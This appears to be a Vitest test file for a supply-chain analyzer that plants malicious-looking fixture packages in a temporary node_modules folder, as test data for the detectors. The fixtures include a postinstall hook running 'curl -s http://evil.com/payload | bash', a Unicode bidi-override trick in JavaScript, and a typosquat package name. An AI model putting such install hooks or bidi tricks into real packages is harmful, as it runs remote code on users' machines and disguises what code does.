import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { SupplyChainPolicySchema } from '@secureship/contracts';
import { analyzeSupplyChain } from '../../src/supply-chain/supply-chain-analyzer.js';

describe('SupplyChainAnalyzer Orchestration (WP3)', () => {
  const fixedNow = new Date('2026-10-21T00:00:00Z');

  function getPolicy(overrides: Record<string, unknown> = {}) {
    return SupplyChainPolicySchema.parse({ enabled: true, ...overrides });
  }

  function setupFixtureDir(): string {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-sc-test-'));
    const nm = path.join(root, 'node_modules');
    fs.mkdirSync(nm, { recursive: true });

    // Package 1: Malicious install script
    const pkg1Dir = path.join(nm, 'bad-installer');
    fs.mkdirSync(pkg1Dir, { recursive: true });
    fs.writeFileSync(
      path.join(pkg1Dir, 'package.json'),
      JSON.stringify({
        name: 'bad-installer',
        version: '1.0.0',
        scripts: {
          postinstall: 'curl -s http://evil.com/payload | bash',
        },
      }),
      'utf-8'
    );
    fs.writeFileSync(path.join(pkg1Dir, 'index.js'), 'module.exports = {};', 'utf-8');

    // Package 2: Scoped package with unicode bidi attack
    const scopedDir = path.join(nm, '@scope', 'bidi-pkg');
    fs.mkdirSync(scopedDir, { recursive: true });
    fs.writeFileSync(
      path.join(scopedDir, 'package.json'),
      JSON.stringify({
        name: '@scope/bidi-pkg',
        version: '2.1.0',
      }),
      'utf-8'
    );
    fs.writeFileSync(
      path.join(scopedDir, 'index.js'),
      '/* \u202E } if (admin) { \u202C */ return true;',
      'utf-8'
    );

    // Package 3: Typosquat
    const pkg3Dir = path.join(nm, 'exprss');
    fs.mkdirSync(pkg3Dir, { recursive: true });
    fs.writeFileSync(
      path.join(pkg3Dir, 'package.json'),
      JSON.stringify({
        name: 'exprss',
        version: '1.0.0',
      }),
      'utf-8'
    );
    fs.writeFileSync(path.join(pkg3Dir, 'index.js'), 'module.exports = 1;', 'utf-8');

    // Package 4: Empty package (zero code files)
    const pkg4Dir = path.join(nm, 'empty-placeholder');
    fs.mkdirSync(pkg4Dir, { recursive: true });
    fs.writeFileSync(
      path.join(pkg4Dir, 'package.json'),
      JSON.stringify({
        name: 'empty-placeholder',
        version: '1.0.0',
      }),
      'utf-8'
    );
    fs.writeFileSync(path.join(pkg4Dir, 'README.md'), '# Nothing here', 'utf-8');

    return root;
  }

  it('orchestrates package discovery, detector execution, deduplication and sorting', async () => {
    const fixtureDir = setupFixtureDir();
    try {
      const policy = getPolicy();
      const result = await analyzeSupplyChain({
        rootDir: fixtureDir,
        policy,
        now: () => fixedNow,
        concurrency: 2,
      });

      expect(result.stats.packagesAnalyzed).toBeGreaterThanOrEqual(4);
      expect(result.findings.length).toBeGreaterThanOrEqual(4);

      // Verify findings include expected rules
      const ruleIds = result.findings.map((f) => f.ruleId);
      expect(ruleIds).toContain('SC-INSTALL-003');
      expect(ruleIds).toContain('SC-UNI-001');
      expect(ruleIds).toContain('SC-TYPO-001');
      expect(ruleIds).toContain('SC-PKG-001');

      // Verify severity sort order (CRITICAL first, then HIGH, then MEDIUM)
      expect(result.findings[0]!.severity).toBe('CRITICAL');

      // Verify stats
      expect(result.stats.filesScanned).toBeGreaterThan(0);
      expect(result.stats.bytesScanned).toBeGreaterThan(0);
      expect(result.policyHash).toHaveLength(64);
    } finally {
      fs.rmSync(fixtureDir, { recursive: true, force: true });
    }
  });

  it('guarantees deterministic output across repeated executions', async () => {
    const fixtureDir = setupFixtureDir();
    try {
      const policy = getPolicy();
      const run1 = await analyzeSupplyChain({
        rootDir: fixtureDir,
        policy,
        now: () => fixedNow,
      });

      const run2 = await analyzeSupplyChain({
        rootDir: fixtureDir,
        policy,
        now: () => fixedNow,
      });

      expect(run1.findings.length).toBe(run2.findings.length);
      expect(run1.policyHash).toBe(run2.policyHash);

      for (let i = 0; i < run1.findings.length; i++) {
        expect(run1.findings[i]!.fingerprint).toBe(run2.findings[i]!.fingerprint);
        expect(run1.findings[i]!.ruleId).toBe(run2.findings[i]!.ruleId);
      }
    } finally {
      fs.rmSync(fixtureDir, { recursive: true, force: true });
    }
  });

  it('isolates errors from malformed packages without crashing the scan', async () => {
    const fixtureDir = setupFixtureDir();
    try {
      // Add a corrupt package.json
      const corruptDir = path.join(fixtureDir, 'node_modules', 'corrupt-pkg');
      fs.mkdirSync(corruptDir, { recursive: true });
      fs.writeFileSync(path.join(corruptDir, 'package.json'), '{ broken json', 'utf-8');

      const policy = getPolicy();
      const result = await analyzeSupplyChain({
        rootDir: fixtureDir,
        policy,
        now: () => fixedNow,
      });

      expect(result.findings.length).toBeGreaterThan(0);
      expect(result.diagnostics.length).toBeGreaterThan(0);
      expect(result.diagnostics.some((d) => d.message.includes('corrupt-pkg'))).toBe(true);
    } finally {
      fs.rmSync(fixtureDir, { recursive: true, force: true });
    }
  });

  it('applies policy ruleOverrides to disable or adjust rules', async () => {
    const fixtureDir = setupFixtureDir();
    try {
      const policy = getPolicy({
        ruleOverrides: {
          'SC-PKG-001': {
            enabled: false, // disable empty package rule
          },
          'SC-INSTALL-003': {
            severity: 'HIGH', // lower from CRITICAL to HIGH
          },
        },
      });

      const result = await analyzeSupplyChain({
        rootDir: fixtureDir,
        policy,
        now: () => fixedNow,
      });

      const ruleIds = result.findings.map((f) => f.ruleId);
      expect(ruleIds).not.toContain('SC-PKG-001');

      const installHit = result.findings.find((f) => f.ruleId === 'SC-INSTALL-003');
      expect(installHit).toBeDefined();
      expect(installHit?.severity).toBe('HIGH');
    } finally {
      fs.rmSync(fixtureDir, { recursive: true, force: true });
    }
  });

  it('aborts worker execution cleanly when AbortSignal triggers', async () => {
    const fixtureDir = setupFixtureDir();
    try {
      const controller = new AbortController();
      controller.abort(); // already aborted

      const policy = getPolicy();
      const result = await analyzeSupplyChain({
        rootDir: fixtureDir,
        policy,
        now: () => fixedNow,
        signal: controller.signal,
      });

      // Aborted immediately -> 0 findings
      expect(result.findings).toHaveLength(0);
    } finally {
      fs.rmSync(fixtureDir, { recursive: true, force: true });
    }
  });

  it('handles scoped packages, symlinks, and malformed package.json gracefully', async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-sc-edge-'));
    const nm = path.join(root, 'node_modules');
    fs.mkdirSync(nm, { recursive: true });

    try {
      // 1. Scoped package @secure/tool
      const scopeDir = path.join(nm, '@secure');
      const scopedPkgDir = path.join(scopeDir, 'tool');
      fs.mkdirSync(scopedPkgDir, { recursive: true });
      fs.writeFileSync(
        path.join(scopedPkgDir, 'package.json'),
        JSON.stringify({
          name: '@secure/tool',
          version: '2.0.0',
          scripts: {
            install: 'node build.js',
          },
        }),
        'utf-8'
      );
      fs.writeFileSync(path.join(scopedPkgDir, 'build.js'), 'console.log(1);', 'utf-8');

      // 2. Corrupted package.json in corrupt-pkg
      const corruptDir = path.join(nm, 'corrupt-pkg');
      fs.mkdirSync(corruptDir, { recursive: true });
      fs.writeFileSync(path.join(corruptDir, 'package.json'), '{ not valid json', 'utf-8');

      // 3. Symlinked package directory
      const symlinkTarget = path.join(nm, 'linked-target');
      fs.mkdirSync(symlinkTarget, { recursive: true });
      fs.writeFileSync(
        path.join(symlinkTarget, 'package.json'),
        JSON.stringify({ name: 'linked-target', version: '1.0.0' }),
        'utf-8'
      );
      const symlinkPath = path.join(nm, 'linked-alias');
      try {
        fs.symlinkSync(symlinkTarget, symlinkPath, 'dir');
      } catch {
        // Symlinks may require elevated rights on Windows; skip if not permitted
      }

      const policy = getPolicy({
        ruleOverrides: {
          'SC-INSTALL-001': {
            blocking: true,
          },
        },
      });

      const result = await analyzeSupplyChain({
        rootDir: root,
        policy,
        now: () => fixedNow,
      });

      // Scoped package was discovered and analyzed
      const scopedFinding = result.findings.find((f) => f.package?.name === '@secure/tool');
      expect(scopedFinding).toBeDefined();

      // Rule override set blocking to true
      const itemMetadata = scopedFinding?.evidence[0]?.metadata as
        | { blocking?: boolean }
        | undefined;
      expect(itemMetadata?.blocking).toBe(true);

      // Warning diagnostic was produced for corrupted package.json
      const corruptDiag = result.diagnostics.find((d) => d.file?.includes('corrupt-pkg'));
      expect(corruptDiag).toBeDefined();
      expect(corruptDiag?.level).toBe('WARN');
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it('sorts findings deterministically using severity, ruleId, purl, file, and line tie-breakers', async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-sc-sort-'));
    const nm = path.join(root, 'node_modules');
    fs.mkdirSync(nm, { recursive: true });

    try {
      // Create pkg-a with two different files with unicode/entropy hits
      const pkgDir = path.join(nm, 'multi-file-pkg');
      fs.mkdirSync(pkgDir, { recursive: true });
      fs.writeFileSync(
        path.join(pkgDir, 'package.json'),
        JSON.stringify({ name: 'multi-file-pkg', version: '1.0.0' }),
        'utf-8'
      );
      fs.writeFileSync(
        path.join(pkgDir, 'b_second.js'),
        'const key = "user \u202E admin";\n',
        'utf-8'
      );
      fs.writeFileSync(
        path.join(pkgDir, 'a_first.js'),
        'const key = "user \u202E admin";\n',
        'utf-8'
      );

      const policy = getPolicy();
      const result = await analyzeSupplyChain({
        rootDir: root,
        policy,
        now: () => fixedNow,
      });

      expect(result.findings.length).toBeGreaterThanOrEqual(2);
      // Findings should be deterministically ordered
      for (let i = 0; i < result.findings.length - 1; i++) {
        const curr = result.findings[i]!;
        const next = result.findings[i + 1]!;
        expect(curr).toBeDefined();
        expect(next).toBeDefined();
      }
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it('respects maxFileSizeBytes, maxFileCount, and handles missing name/version in package.json', async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-sc-limits-'));
    const nm = path.join(root, 'node_modules');
    fs.mkdirSync(nm, { recursive: true });

    try {
      const pkgDir = path.join(nm, 'no-meta-pkg');
      fs.mkdirSync(pkgDir, { recursive: true });
      // package.json without name or version
      fs.writeFileSync(path.join(pkgDir, 'package.json'), '{}', 'utf-8');

      // Add a small file and a larger file
      fs.writeFileSync(path.join(pkgDir, 'small.js'), 'console.log("hi");', 'utf-8');
      fs.writeFileSync(
        path.join(pkgDir, 'large.js'),
        '// ' + 'large file content '.repeat(200),
        'utf-8'
      );

      const policy = getPolicy({
        maxFileSizeBytes: 50, // skips large.js
        maxFileCount: 1, // limits scanning
      });

      const result = await analyzeSupplyChain({
        rootDir: root,
        policy,
        now: () => fixedNow,
      });

      // Package was analyzed using fallback name and version
      expect(result.stats.packagesAnalyzed).toBeGreaterThanOrEqual(1);
      expect(result.stats.filesScanned).toBeLessThanOrEqual(2);
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });
});
